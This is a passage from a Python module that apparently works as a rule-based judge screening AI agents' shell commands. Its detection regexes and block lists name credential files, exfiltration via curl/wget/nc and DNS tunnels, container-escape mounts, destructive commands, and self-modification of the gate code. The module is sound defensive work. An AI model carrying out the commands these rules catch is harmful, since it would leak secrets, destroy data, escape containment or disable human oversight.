                        "from disk if legitimate."
                    ),
                ),
            )
        else:
            _hex_match = re.search(r"\b[A-Fa-f0-9]{400,}\b", _body)
            if _hex_match:
                verdicts.append(
                    RuleVerdict(
                        "OBFUSC_LONG_ENCODED_BLOB",
                        "high",
                        "Long hex blob embedded in interpreter -c body.",
                        evidence=(f"hex_len={len(_hex_match.group(0))} :: {command[:100]}"),
                        recommendation=(
                            "Inline hex blobs ≥400 chars in a -c body "
                            "are almost always encoded payload. Write "
                            "to a file and decode/inspect via the audited "
                            "MCP tools."
                        ),
                    ),
                )

    # OBFUSC_STRING_ASSEMBLY — dangerous identifier reconstructed
    # from concatenated short string literals.
    _DANGEROUS_RECONSTRUCTED = {
        "open",
        "exec",
        "eval",
        "system",
        "popen",
        "subprocess",
        "compile",
        "import",
        "rm",
        "curl",
        "wget",
        "ssh",
        "nc",
    }
    for _concat in re.finditer(
        r"((?:['\"][^'\"]{0,4}['\"]\s*[+.]\s*){2,}['\"][^'\"]{0,4}['\"])",
        command,
    ):
        _joined = re.sub(r"['\"\s+.]", "", _concat.group(1))
        if _joined.lower() in _DANGEROUS_RECONSTRUCTED:
            verdicts.append(
                RuleVerdict(
                    "OBFUSC_STRING_ASSEMBLY",
                    "critical",
                    "Dangerous identifier reconstructed from concatenated "
                    "short string literals — classic obfuscation tell.",
                    evidence=f"reconstructed={_joined!r} :: {command[:150]}",
                    recommendation=(
                        "Refuse. Building 'open' / 'exec' / 'eval' / "
                        "'system' from short string fragments has no "
                        "legitimate use and is a known evasion shape."
                    ),
                ),
            )
            break

    # EXFIL_SENSITIVE_READ_TO_NET — credential file read into network call.
    # File patterns accept optional path-prefix (~/, /home/x/, C:\Users\x\,
    # ./, ../, etc.) and tolerate both / and \ as separators so Windows
    # `-InFile C:\Users\op\.aws\credentials` and Unix `~/.aws/credentials`
    # both match.
    # Optional path prefix — accepts Unix (~/, /home/x/, ../) AND
    # Windows (C:\Users\x\, .\) shapes. Colon for drive letter,
    # backslash escaped for path separator.
    _SF = r"(?:[~A-Za-z0-9_:.\\/-]+[/\\])?"
    _SENSITIVE_FILES = (
        rf"{_SF}\.env(?:\.\w+)?"
        rf"|{_SF}\.ssh[/\\][A-Za-z0-9_./\\-]+"
        rf"|{_SF}\.aws[/\\]credentials"
        rf"|{_SF}\.netrc|{_SF}_netrc"
        rf"|{_SF}\.pgpass"
        rf"|{_SF}[A-Za-z0-9_./\\-]+\.pem"
        rf"|{_SF}[A-Za-z0-9_./\\-]+\.key"
        rf"|{_SF}id_(?:rsa|ed25519|ecdsa|dsa)"
        rf"|{_SF}\.MEMORY[/\\][A-Za-z0-9_./\\-]+"
        rf"|{_SF}[A-Za-z0-9_./\\-]*\.sqlite3?"
    )
    _NET_TOOLS = (
        r"curl|wget|fetch|nc|ncat|"
        r"invoke-webrequest|iwr|invoke-restmethod|irm"
    )
    if (
        re.search(
            rf"\b(?:cat|type|head|tail|Get-Content|gc)\b[^|]*"
            rf"(?:{_SENSITIVE_FILES})[^|]*\|\s*(?:{_NET_TOOLS})\b",
            command,
            re.IGNORECASE,
        )
        or re.search(
            rf"\b(?:{_NET_TOOLS})\b[^\n]*@(?:{_SENSITIVE_FILES})",
            command,
            re.IGNORECASE,
        )
        or re.search(
            rf"\bcurl\b[^\n]*-T\s+(?:{_SENSITIVE_FILES})",
            command,
            re.IGNORECASE,
        )
        or re.search(
            rf"-InFile\s+(?:{_SENSITIVE_FILES})",
            command,
            re.IGNORECASE,
        )
    ):
        verdicts.append(
            RuleVerdict(
                "EXFIL_SENSITIVE_READ_TO_NET",
                "critical",
                "Credential / secret / database file is being read and "
                "shipped to a network destination — exfiltration shape.",
                evidence=command[:200],
                recommendation=(
                    "Refuse. Reading .env, .ssh/, .aws/credentials, "
                    "*.pem/*.key, ssh private keys, or sqlite databases "
                    "and piping to curl/wget/nc/Invoke-WebRequest is the "
                    "canonical exfil shape."
                ),
            ),
        )

    # EXFIL_DNS_TUNNEL — DNS query with long encoded subdomain.
    if re.search(
        r"\b(?:dig|nslookup|host|drill|kdig|resolvectl\s+query)\b"
        r"[^\n]*?\b([A-Za-z0-9]{30,})\.[A-Za-z0-9.-]+",
        command,
    ):
        verdicts.append(
            RuleVerdict(
                "EXFIL_DNS_TUNNEL",
                "critical",
                "DNS query with long encoded subdomain label — classic "
                "DNS-tunnel exfiltration shape.",
                evidence=command[:200],
                recommendation=(
                    "Refuse. dig/nslookup with a ≥30-char subdomain "
                    "label is the canonical DNS-tunneling shape. The "
                    "egress-firewall wall (separate work) is the "
                    "structural fix."
                ),
            ),
        )

    # SELF_MOD_GATE_CODE — shell writing to mcp/server/aidocs_mcp/.
    # The write TARGET must be a gate path. Correlating the write with the
    # gate path (rather than "gate path anywhere AND a write-shape anywhere")
    # stops false positives like `git add mcp/server/aidocs_mcp/x.py && git
    # commit -m "... -> ..."` — git add/commit stage/record a file, they do not
    # shell-write it, and an arrow in a commit message is not a redirect.
    _gate = r"(?:[A-Za-z]:[/\\])?mcp[/\\]server[/\\]aidocs_mcp[/\\]"
    if re.search(
        rf">>?\s*{_gate}"  # redirect INTO a gate path:  > mcp/server/aidocs_mcp/x.py
        rf"|\b(?:cp|mv|tee)\b[^\n|&;]*?{_gate}"  # cp/mv/tee whose target is a gate path
        rf"|open\s*\([^)]*{_gate}[^)]*['\"][wax+]"  # open('<gate>.py', 'w')
        rf"|{_gate}[^'\"]*['\"]\s*\)\s*\.\s*write_(?:text|bytes)",  # Path('<gate>').write_text(
        command,
    ):
        verdicts.append(
            RuleVerdict(
                "SELF_MOD_GATE_CODE",
                "critical",
                "Shell command writing to gate code (mcp/server/aidocs_mcp/) "
                "— direct privilege escalation shape.",
                evidence=command[:200],
                recommendation=(
                    "Refuse. The gate code MUST NOT be modified via "
                    "shell. All edits go through the MCP edit tools so "
                    "the audit trail, anchored-memory gate, and read-"
                    "before-edit gate fire."
                ),
            ),
        )
    return verdicts


def _bash_privilege_rules(command: str, lower: str) -> list[RuleVerdict]:
    """Privilege / process / DB / env-leak / install / docker-priv rules.

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # HIGH: sudo usage
    if re.search(r"\bsudo\b", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_SUDO",
                "high",
                "Elevated privilege execution.",
                evidence=command[:200],
                recommendation="Agents should not need root privileges.",
            ),
        )

    # HIGH: process killing
    if re.search(r"\b(kill\s+-9|killall|pkill)\b", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_KILL_PROCESS",
                "high",
                "Process termination command.",
                evidence=command[:200],
                recommendation="Confirm which process and why.",
            ),
        )

    # HIGH: database drop/truncate
    # Covers the SQL-STATEMENT shape (`drop table|database|schema`) AND the
    # two CLI-wrapper shapes an operator actually types at a shell: `dropdb
    # <name>` (Postgres) and `mysqladmin drop <name>` (MySQL). #660 — those
    # two were prose-only claims (KNOWN_UNCOVERED_SHAPES in judge_taxonomy)
    # until this widening; see the parity gate in
    # tests/security/test_taxonomy_pattern_parity_624.py.
    #
    # `dropdb\s+\S` requires an argument after the command name so bare
    # `which dropdb` / `man dropdb` (no destructive action) don't fire, and
    # so a filename like `dropdb.sql` (no trailing whitespace+arg) doesn't
    # either. `mysqladmin\s+drop\b` is scoped to the literal `drop`
    # subcommand so `mysqladmin status`/`ping` are untouched. Neither
    # sub-pattern matches `git stash drop`, `iptables ... -j DROP`, or a
    # `--drop*` flag on an unrelated tool — see
    # tests/security/test_heuristic_judge.py for the pinned cases.
    if re.search(
        r"\b(drop\s+(table|database|schema)|truncate\s+table|dropdb\s+\S|mysqladmin\s+drop\b)",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_DB_DROP",
                "high",
                "Database destructive operation.",
                evidence=command[:200],
                recommendation="Back up data before destructive DB operations.",
            ),
        )

    # HIGH: environment variable exfiltration
    # Bounded word boundaries on both sides: `\bset\b` not `set\b` — otherwise
    # `reset` matches as `re**set**` because `\b` only needs a non-word char,
    # and `-` qualifies. Same for `env`. Also require the pipe/redirect to be
    # close to the env command (within a plausible chain), not anywhere in the
    # whole command, to avoid matching `git reset --hard HEAD~1 2>&1`.
    if re.search(r"(\bprintenv\b|\benv\b|\bset\b)\s*(\||\s*>\s*\S)", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_ENV_LEAK",
                "high",
                "Environment variables piped or redirected — possible credential exfiltration.",
                evidence=command[:200],
                recommendation="Do not pipe env to external commands.",
            ),
        )

    # MEDIUM: package install without pinning
    if re.search(r"(pip|npm|cargo|go)\s+install\s+(?!.*[=@#])", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_UNPIN_INSTALL",
                "medium",
                "Package install without version pinning.",
                evidence=command[:200],
                recommendation="Pin package versions to prevent supply chain attacks.",
            ),
        )

    # MEDIUM: docker with privileged or host network
    if re.search(r"docker\s+run.*--(privileged|net=host|pid=host)", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_DOCKER_PRIV",
                "high",
                "Docker container with elevated permissions.",
                evidence=command[:200],
                recommendation=(
                    "--privileged / --net=host / --pid=host break the "
                    "container boundary. Real escape vector — confirm "
                    "the workflow needs them."
                ),
            ),
        )
    return verdicts


def _bash_container_escape_rules(command: str, lower: str) -> list[RuleVerdict]:
    """Container / hypervisor / host-escape family rules (Batches 5-6).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── Batch 5 (#46 step 5): container/host escape family ──

    # CRITICAL: docker mounting host root filesystem.
    # Real shapes (test-pinned in test_judge_batch5):
    #   docker run -v /:/host
    #   docker run -v "/":/host
    #   docker run --volume=/:/host
    #   docker run -v /:/anything (any in-container target)
    #   docker run -v /:/host:ro (read-only still leaks fortress)
    #   docker run --mount type=bind,source=/,target=/host
    #   docker run --mount=type=bind,src=/,dst=/host
    # Pattern strategy: anchor on `docker\s+run`, then look for any
    # of (-v|--volume=|--mount with type=bind) shape where the host
    # source resolves to bare `/`.
    if re.search(r"\bdocker\s+run\b", lower):
        _docker_scan = _strip_prose_windows(command)
        if (
            re.search(
                # -v /:<target>  or  -v "/":<target>  with any optional flags
                r"-v\s+['\"]?/['\"]?:",
                _docker_scan,
            )
            or re.search(
                r"--volume\s*=\s*['\"]?/['\"]?:",
                _docker_scan,
            )
            or re.search(
                # --mount type=bind,source=/,target=…  (also accepts src=/, equals or space)
                r"--mount(?:\s+|=)[^\s]*type\s*=\s*bind[^\s]*"
                r"(?:source|src)\s*=\s*/(?:[,\s]|$)",
                _docker_scan,
            )
        ):
            verdicts.append(
                RuleVerdict(
                    "BASH_DOCKER_ROOT_MOUNT",
                    "critical",
                    "Docker mount of host root filesystem into container.",
                    evidence=command[:200],
                    recommendation=(
                        "Mounting host `/` into a container (any target "
                        "path, even read-only) is instant host escape. "
                        "Use a narrower bind path."
                    ),
                ),
            )

    # CRITICAL: docker mounting docker.sock — full daemon control.
    if re.search(r"\bdocker\s+run\b", lower):
        _sock_scan = _strip_prose_windows(command)
        if re.search(
            r"(?:-v|--volume\s*=)\s*['\"]?/var/run/docker\.sock"
            r"['\"]?:",
            _sock_scan,
        ) or re.search(
            r"--mount(?:\s+|=)[^\s]*type\s*=\s*bind[^\s]*"
            r"(?:source|src)\s*=\s*/var/run/docker\.sock",
            _sock_scan,
        ):
            verdicts.append(
                RuleVerdict(
                    "BASH_DOCKER_SOCK_MOUNT",
                    "critical",
                    "Docker socket mounted inside container — daemon API exposure.",
                    evidence=command[:200],
                    recommendation=(
                        "Mounting /var/run/docker.sock inside a container "
                        "gives that container full host control via the "
                        "docker daemon. No legitimate workflow."
                    ),
                ),
            )

    # CRITICAL/HIGH: chroot — split classifier-driven by target.
    # FORBIDDEN: target ∈ {/, /host, /mnt/host, /rootfs} — host root
    # or mounted-host subtree.
    # CONFIRMABLE: any other target (build chroots, sandboxes).
    _chroot_match = re.search(
        r"(?:^|[\s;&|])chroot\s+(\S+)",
        _strip_prose_windows(command),
    )
    if _chroot_match:
        _chroot_target = _chroot_match.group(1).strip("'\"")
        # Normalize trailing slash so /host and /host/ are equivalent.
        _chroot_target_norm = _chroot_target.rstrip("/") or "/"
        if _chroot_target_norm in ("/", "/host", "/mnt/host", "/rootfs"):
            verdicts.append(
                RuleVerdict(
                    "BASH_CHROOT_HOST_FORBIDDEN",
                    "critical",
                    "chroot into host root or mounted-host subtree.",
                    evidence=command[:200],
                    recommendation=(
                        "chroot to /, /host, /mnt/host, or /rootfs is "
                        "host escape from a container/sandbox. Hard-deny."
                    ),
                ),
            )
        else:
            verdicts.append(
                RuleVerdict(
                    "BASH_CHROOT_BUILDROOT_CONFIRMABLE",
                    "high",
                    "chroot into a build/sandbox root.",
                    evidence=command[:200],
                    recommendation=(
                        "chroot to a build root or sandbox is a real "
                        "workflow (debootstrap, schroot, package builds). "
                        "Confirm the target is intentional."
                    ),
                ),
            )

    # Both kubectl rules below scan a prose-stripped view of the
    # command. The same shared helper used by BASH_NET_UPLOAD and
    # BASH_CP_DEVNULL_OVERWRITE — keeps `echo "kubectl exec -it …"`
    # and `git commit -m "ran kubectl debug node/x"` from tripping.
    _kubectl_scan = _strip_prose_windows(command)

    # HIGH: kubectl exec interactive shell into a pod.
    # Real shape: `kubectl exec -it|-ti|--stdin --tty <pod> [-c …]
    # [-n …] -- (/bin/)?(sh|bash|zsh|ash|dash)`. The interactive
    # flag combo is what makes it a shell — non-interactive
    # `kubectl exec POD -- ls` is its own (different) lane.
    if re.search(
        r"\bkubectl\s+exec\b[^\n]*?"
        r"(?:-it|-ti|-i\s+-t|-t\s+-i|--stdin\s+--tty|--tty\s+--stdin)"
        r"[^\n]*--\s+(?:/bin/)?(?:sh|bash|zsh|ash|dash)\b",
        _kubectl_scan,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_KUBECTL_EXEC_SHELL",
                "high",
                "Interactive shell into a Kubernetes pod.",
                evidence=command[:200],
                recommendation=(
                    "kubectl exec -it <pod> -- /bin/sh|bash is the "
                    "lateral-movement-into-pod workflow. Operator-runnable "
                    "for legit debugging; confirm the pod and intent."
                ),
            ),
        )

    # CRITICAL: kubectl debug node/<name> — host-root escape ladder.
    # Mounts the host filesystem into the debug container and shares
    # its process namespace with the node. No operator-confirm path;
    # use raw shell if a real ops workflow needs it.
    if re.search(
        r"\bkubectl\s+debug\s+node/\S+",
        _kubectl_scan,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_KUBECTL_DEBUG_NODE",
                "critical",
                "kubectl debug against a node — host filesystem escape.",
                evidence=command[:200],
                recommendation=(
                    "kubectl debug node/<name> mounts the node's root "
                    "filesystem and shares its process namespace. Hard-"
                    "deny; raw shell only for legitimate ops workflows."
                ),
            ),
        )

    # ── Batch 6 (#46 step 5): hypervisor / infra destructive family ──
    # Three rules, each catches only its named destructive sub-verbs.
    # Graceful siblings (shutdown / suspend / list / info / savestate
    # / acpipowerbutton) are explicitly excluded. All high/confirmable
    # — operator-runnable but real state change worth confirming.

    # Use the prose-stripped scan so `echo "virsh destroy …"` etc.
    # don't trip the rule.
    _hv_scan = _strip_prose_windows(command)

    # HIGH: virsh hard-stop / undefine. Catches:
    #   virsh destroy <vm>
    #   virsh undefine <vm> [--remove-all-storage]
    #   virsh shutdown <vm> --mode=hard
    # Excludes: shutdown (graceful), suspend, resume, list, dominfo,
    #           domstate.
    if re.search(
        r"\bvirsh\s+(?:destroy|undefine)\b"
        r"|\bvirsh\s+shutdown\b[^\n]*--mode\s*=\s*hard\b",
        _hv_scan,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_VIRSH_DESTROY",
                "high",
                "libvirt destructive operation (destroy / undefine / hard-shutdown).",
                evidence=command[:200],
                recommendation=(
                    "virsh destroy is hard power-off; virsh undefine "
                    "removes the domain definition. Both are real state "
                    "changes — confirm the guest and intent."
                ),
            ),
        )

    # HIGH: VirtualBox destructive controlvm / unregistervm.
    # Catches:
    #   VBoxManage controlvm <vm> poweroff
    #   VBoxManage unregistervm <vm> [--delete]
    # Excludes: controlvm savestate / acpipowerbutton / pause /
    #           resume, list, showvminfo. Case-insensitive on the
    #           VBoxManage executable name (Windows convention is
    #           CamelCase, Linux often lowercased).
    if re.search(
        r"\bvboxmanage\s+controlvm\s+\S+\s+poweroff\b"
        r"|\bvboxmanage\s+unregistervm\b",
        _hv_scan,
        re.IGNORECASE,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_VBOX_DESTROY",
                "high",
                "VirtualBox destructive operation (controlvm poweroff / unregistervm).",
                evidence=command[:200],
                recommendation=(
                    "controlvm poweroff hard-stops the VM; unregistervm "
                    "removes it (use --delete to also drop disks). "
                    "Confirm the VM identity and intent."
                ),
            ),
        )

    # HIGH: Hyper-V destructive cmdlets. Catches:
    #   Stop-VM ... -TurnOff
    #   Remove-VM ...
    # Excludes: plain Stop-VM (graceful), Suspend-VM, Save-VM,
    #           Start-VM, Resume-VM, Get-VM. PowerShell cmdlet
    #           names are case-insensitive — match accordingly.
    if re.search(
        r"\bStop-VM\b[^\n]*-TurnOff\b|\bRemove-VM\b",
        _hv_scan,
        re.IGNORECASE,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_HYPERV_DESTROY",
                "high",
                "Hyper-V destructive cmdlet (Stop-VM -TurnOff / Remove-VM).",
                evidence=command[:200],
                recommendation=(
                    "Stop-VM -TurnOff is hard power-off; Remove-VM "
                    "removes the VM definition. Confirm the VM and intent."
                ),
            ),
        )
    return verdicts


def _bash_fs_write_upload_rules(command: str, lower: str) -> list[RuleVerdict]:
    """chmod / overwrite-redirect / outbound-upload / auth-token-exfil rules.

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # MEDIUM: chmod 777
    if re.search(r"chmod\s+777", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_CHMOD_WORLD",
                "medium",
                "World-writable permissions.",
                evidence=command[:200],
            ),
        )

    # LOW: redirecting stdout to a file (overwrite)
    # Tightened (2026-04-17): ignore stderr-suppression idioms
    # (`2>/dev/null`, `1>/dev/null`, `&>/dev/null`, `2>&1`). They're not
    # destructive — the file descriptor is being discarded, not overwriting
    # a meaningful target. Rule now only fires on a bare stdout redirect
    # (not prefixed by `1`, `2`, or `&`) to an absolute path.
    # Strip stderr-suppression tokens, then re-check the remainder.
    _no_stderr_redir = re.sub(r"[12&]>\s*(?:/dev/null|&\d)", "", command)
    _no_stderr_redir = re.sub(r">&\d", "", _no_stderr_redir)
    if re.search(r"(?<![12&])>\s*/", _no_stderr_redir):
        pre = _no_stderr_redir.split(">")[0] + ">"
        if ">>" not in pre:
            verdicts.append(
                RuleVerdict(
                    "BASH_OVERWRITE_REDIRECT",
                    "low",
                    "File overwrite via redirect.",
                    evidence=command[:200],
                ),
            )

    # HIGH: outbound upload with file payload — exfiltration leg of the
    # "lethal trifecta" (Willison) / Copilot-CamoLeak / Replit-agent class.
    # Red-team 2026-04-17 P1: curl -X POST -d @<file>, --data-binary @<file>,
    # -T <file>, -F name=@<file>, wget --post-file, Invoke-WebRequest -InFile.
    #
    # Argv-scoping: narrow the scan window so the rule fires on real
    # invocations only — not on text-valued arguments to binaries that
    # treat their argument as prose/code (git commit -m, echo, python -c).
    # The first time this rule shipped it matched its own pattern inside
    # a `git commit -m` heredoc. Note we DON'T strip all quoted strings:
    # `curl -F 'name=@file'` and `powershell -c "Invoke-WebRequest ..."`
    # both legitimately put real invocation syntax inside quotes.
    # BASH_NET_UPLOAD's pattern would otherwise fire on legit inline
    # code (`python -c "import urllib.request"`) that the inline
    # scanner owns. So this rule strips python -c bodies; most other
    # shell rules should not.
    exfil_scan = _strip_prose_windows(
        command,
        strip_heredoc=True,
        strip_git_commit_m=True,
        strip_echo_quoted=True,
        strip_python_c=True,
    )

    for pat in _OUTBOUND_UPLOAD_PATTERNS:
        if re.search(pat, exfil_scan, re.IGNORECASE):
            verdicts.append(
                RuleVerdict(
                    "BASH_NET_UPLOAD",
                    "high",
                    "Outbound network upload with file payload.",
                    evidence=command[:200],
                    recommendation=(
                        "Uploading file contents to a remote URL is the exfiltration "
                        "leg of the 'lethal trifecta' (untrusted input + private "
                        "data + outbound channel). Confirm the destination, payload, "
                        "and authorization."
                    ),
                ),
            )
            break

    # ── Batch 8 (#46 step 5): auth-token exfil single-call family ──
    # Compound rule: fires only when BOTH legs are present in the
    # same prose-stripped command:
    #   (a) a real auth-token-producing command
    #   (b) an upload-shape pattern (reuses the shared
    #       _OUTBOUND_UPLOAD_PATTERNS — no weaker duplicate)
    # Cross-call chains (token in turn 1, exfil in turn 2) are
    # deferred to #43 strikes — judge is single-call.
    #
    # Excluded by design (see test FP pins):
    #   - aws sts get-caller-identity (identity, not token)
    #   - aws configure list / gcloud config list (config view)
    #   - kubectl config view (without --raw — sanitized)
    _AUTH_TOKEN_PRODUCERS = (
        r"\bgcloud\s+auth\s+print-access-token\b",
        r"\baz\s+account\s+get-access-token\b",
        r"\bgh\s+auth\s+token\b",
        # `kubectl config view --raw` exposes tokens; without --raw
        # the output is sanitized.
        r"\bkubectl\s+config\s+view\b[^\n]*--raw\b",
        r"\baws\s+ecr\s+get-login-password\b",
    )
    _producer_match = any(re.search(p, exfil_scan, re.IGNORECASE) for p in _AUTH_TOKEN_PRODUCERS)
    if _producer_match:
        _upload_match = any(
            re.search(p, exfil_scan, re.IGNORECASE) for p in _OUTBOUND_UPLOAD_PATTERNS
        )
        if _upload_match:
            verdicts.append(
                RuleVerdict(
                    "BASH_AUTH_TOKEN_EXFIL",
                    "critical",
                    "Auth-token-producing command piped to outbound upload in same call.",
                    evidence=command[:200],
                    recommendation=(
                        "An auth-token producer (gcloud/az/gh/kubectl/aws "
                        "ecr) combined with an outbound upload in the "
                        "same call is the canonical credential-exfil "
                        "shape. Hard-deny; if a real workflow needs both "
                        "legs, run them separately so each is audited."
                    ),
                ),
            )
    return verdicts


def _bash_platform_destructive_rules(command: str, lower: str) -> list[RuleVerdict]:
    """Windows / PowerShell / user-mgmt / sensitive-read / disk / find-delete rules.

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # CRITICAL: Windows destructive commands
    if re.search(r"\b(del\s+/[sfq]|rmdir\s+/s|format\s+[a-z]:)", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_WIN_DELETE",
                "critical",
                "Windows destructive file/directory command.",
                evidence=command[:200],
                recommendation="Use specific file paths, never broad delete commands.",
            ),
        )

    # CRITICAL: PowerShell destructive commands
    if re.search(r"(remove-item|ri\s).*-recurse|-r\b.*remove-item", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_PS_REMOVE",
                "critical",
                "PowerShell recursive delete.",
                evidence=command[:200],
                recommendation="Verify path before recursive PowerShell delete.",
            ),
        )

    # HIGH: user/account management
    if re.search(r"\b(useradd|userdel|adduser|deluser|net\s+user|passwd\s|usermod)\b", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_USER_MGMT",
                "high",
                "System user management command.",
                evidence=command[:200],
                recommendation="Agents should not manage system users.",
            ),
        )

    # HIGH: sensitive file access
    if re.search(
        r"\b(cat|less|more|head|tail|vi|nano|read)\b.*(/etc/(shadow|passwd|sudoers)|\.ssh/|\.env\b|credentials|\.aws/|\.npmrc)",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_SENSITIVE_READ",
                "high",
                "Reading sensitive system or credential file.",
                evidence=command[:200],
                recommendation="Do not read credential or system auth files.",
            ),
        )

    # HIGH: disk/partition operations
    if re.search(r"\b(mkfs|fdisk|parted|diskpart)\b", lower) or re.search(r"\bdd\s+if=", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_DISK_OPS",
                "high",
                "Disk/partition operation.",
                evidence=command[:200],
                recommendation="Agents should never format disks or write raw partitions.",
            ),
        )

    # CRITICAL: find ... -delete — destructive filesystem traversal
    if re.search(r"\bfind\b.*\s-delete\b", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_FIND_DELETE",
                "critical",
                "find ... -delete removes every matched path.",
                evidence=command[:200],
                recommendation="Use explicit paths; do not delete via find.",
            ),
        )

    # CRITICAL: find ... -exec rm — same destructive pattern via -exec
    if re.search(r"\bfind\b.*-exec\s+(rm|rmdir|unlink|del)\b", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_FIND_EXEC_RM",
                "critical",
                "find ... -exec rm removes every matched path.",
                evidence=command[:200],
                recommendation="Use explicit paths; do not delete via find -exec.",
            ),
        )
    return verdicts


def _bash_protected_path_indirection_rules(command: str, lower: str, project_root: Path | None) -> list[RuleVerdict]:
    """Protected-path indirection family (cp /dev/null, ln -s, mv) — Batch 4.

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── Batch 4 (#46 step 5): protected-path indirection family ──
    # Three patterns where a non-destructive verb (cp, ln, mv) hits
    # a protected target and produces a destructive effect.
    # The symlink/mv rules use the #42 protected_paths_classifier and
    # split into _FORBIDDEN (AIDOCS / host-harness / persistence) and
    # _CONFIRMABLE (other system/non-fortress paths) per the locked
    # 1:1 rule_id↔class invariant.

    # HIGH: cp /dev/null <target> — content-zero-out by overwriting
    # a file with /dev/null. Operator-runnable on non-protected
    # targets (ad-hoc log rotation), so confirmable. cp /dev/zero
    # has the same shape and same confirmable disposition.
    # Strip prose windows but NOT python -c bodies — an inline body
    # invoking `cp /dev/null …` via os.system is a real meta-bypass
    # we still want to catch (it's just routed through a different
    # rule lane in the inline scanner).
    if re.search(
        r"\bcp\s+(?:-\S+\s+)*/dev/(?:null|zero)\s+\S",
        _strip_prose_windows(command).lower(),
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_CP_DEVNULL_OVERWRITE",
                "high",
                "cp /dev/null|/dev/zero overwrites a file by zeroing it.",
                evidence=command[:200],
                recommendation=(
                    "`cp /dev/null <file>` is the canonical 'wipe a file's "
                    "contents in place' shape. Operator-runnable for ad-hoc "
                    "log rotation; confirm before destroying."
                ),
            ),
        )

    # Helper: pull absolute-path-shaped tokens from a shell command
    # and classify each. Returns (forbidden_hits, confirmable_hits)
    # — each entry is (path, classification, reason). Matches:
    #   - leading / followed by non-whitespace
    #   - leading ~ (~/.aidocs/…, ~/.claude/…)
    #   - drive-letter Windows paths (C:\…, C:/…)
    # The classifier's CLASS_FORBIDDEN_* maps to forbidden bucket;
    # any other system-path-shaped token is confirmable.
    def _classify_shell_path_tokens(
        cmd_text: str,
        want_after: str | None = None,
    ) -> tuple[list[tuple[str, str, str]], list[tuple[str, str, str]]]:
        # Lazy-import classifier consts and function — same fallback
        # shape as the inline-rule block uses.
        try:
            from .protected_paths_classifier import (
                CLASS_FORBIDDEN_AIDOCS,
                CLASS_FORBIDDEN_HOST_HARNESS,
                CLASS_FORBIDDEN_PERSISTENCE,
                classify_path,
            )
        except Exception:
            return [], []
        forbidden_classes = {
            CLASS_FORBIDDEN_AIDOCS,
            CLASS_FORBIDDEN_HOST_HARNESS,
            CLASS_FORBIDDEN_PERSISTENCE,
        }
        # Restrict scan window if caller wants tokens that follow a
        # specific verb (e.g. only the source-arg of `mv`, only the
        # target-arg of `ln -s`).
        scan = cmd_text
        if want_after:
            m_anchor = re.search(want_after, cmd_text, re.IGNORECASE)
            if not m_anchor:
                return [], []
            scan = cmd_text[m_anchor.end() :]
        forbidden_hits: list[tuple[str, str, str]] = []
        confirmable_hits: list[tuple[str, str, str]] = []
        for m in re.finditer(
            r"(?:^|[\s=:'\"])((?:~/|/|[A-Za-z]:[\\/])\S+)",
            scan,
        ):
            tok = m.group(1).strip("'\"")
            if not tok or tok in ("/", "/.", "/dev/null", "/dev/zero"):
                continue
            try:
                pc = classify_path(tok, project_root=project_root)
            except Exception:
                continue
            if pc.classification in forbidden_classes:
                forbidden_hits.append((tok, pc.classification, pc.reason))
            elif tok.startswith(("/etc/", "/usr/", "/var/", "/boot/", "/sys/", "/proc/", "/root/")):
                # Non-fortress but recognisable system path. Confirmable
                # signal. (Operator may legitimately mv/symlink under
                # /var/cache; the rule asks them to ack.)
                confirmable_hits.append((tok, "system_path", "system root subtree"))
        return forbidden_hits, confirmable_hits

    # CRITICAL/HIGH: ln -s pointing at a protected target. The link
    # itself is harmless; subsequent writes through the link can
    # rewrite the protected target. Two-IDs split per locked
    # invariant: _FORBIDDEN for AIDOCS / host-harness / persistence,
    # _CONFIRMABLE for other system paths.
    _ln_match = re.search(
        r"\bln\s+(?:-\S*s\S*\s+)+(\S+)\s+(\S+)",
        lower,
    )
    if _ln_match:
        # The first arg after `ln -s…` is the target (what the link
        # points to). That's the protected-resource concern.
        ln_forbidden, ln_confirmable = _classify_shell_path_tokens(
            command,
            want_after=r"\bln\s+(?:-\S*s\S*\s+)+",
        )
        if ln_forbidden:
            verdicts.append(
                RuleVerdict(
                    "BASH_SYMLINK_TO_PROTECTED_FORBIDDEN",
                    "critical",
                    "Symlink target classifies as AIDOCS / host-harness / persistence.",
                    evidence=command[:200],
                    recommendation=(
                        "Symlink pointing at a fortress path lets later "
                        "writes through the link rewrite the protected "
                        "resource. Hard-deny."
                    ),
                ),
            )
        elif ln_confirmable:
            verdicts.append(
                RuleVerdict(
                    "BASH_SYMLINK_TO_PROTECTED_CONFIRMABLE",
                    "high",
                    "Symlink target is a system path.",
                    evidence=command[:200],
                    recommendation=(
